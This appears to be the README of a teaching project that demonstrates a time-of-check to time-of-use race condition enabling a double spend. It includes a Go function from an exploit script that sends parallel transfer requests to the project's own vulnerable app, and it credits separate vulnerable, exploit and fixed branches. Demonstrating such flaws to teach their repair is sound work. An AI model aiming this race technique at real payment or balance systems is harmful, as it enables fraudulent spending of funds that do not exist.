# TOCTOU Vulnerability

_Time-of-check_ to _time-of-use_ is a security vulnerability involving race conditions.

A program is vulnerable to a TOCTOU race condition if it does the following:
1. Checks some property or validates some data
2. Takes some action based on this information

## The demonstration

This demo showcases a _double spend_ vulnerability.
The system is exploited by several transactions that are executed in parallel.
This results in the ability to spend non-existing funds.

For example, if a user has a balance of 500, two parallel transfers can result in the total transfer of 1000, and the user's balance becoming -500.

```go
func runRace(client *http.Client, cfg config) (int64, int64) {
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	ready := make(chan struct{})
	var wg sync.WaitGroup
	var successful atomic.Int64
	var failed atomic.Int64

	for i := 0; i < cfg.requests; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			<-ready

			if err := transfer(ctx, client, cfg); err != nil {
				failed.Add(1)
				return
			}
			successful.Add(1)
		}()
	}

	close(ready)
	wg.Wait()

	return successful.Load(), failed.Load()
}
```
Code snippet 1: Function in `attack/exploit.go` which creates the race condition.

## Contributors

| Name                                                | Task                             | Branch           |
|-----------------------------------------------------|----------------------------------|------------------|
| [Luka Obradović](https://github.com/lobradovic)    | Vulnerable application           | `vuln`           |
| [Vukadin Lazarević](https://github.com/LazarevicV) | Exploit script                   | `vuln`           |
| [Luka Mihailović](https://github.com/lmihailovic)   | Safe application + documentation | `fix` + `master` |
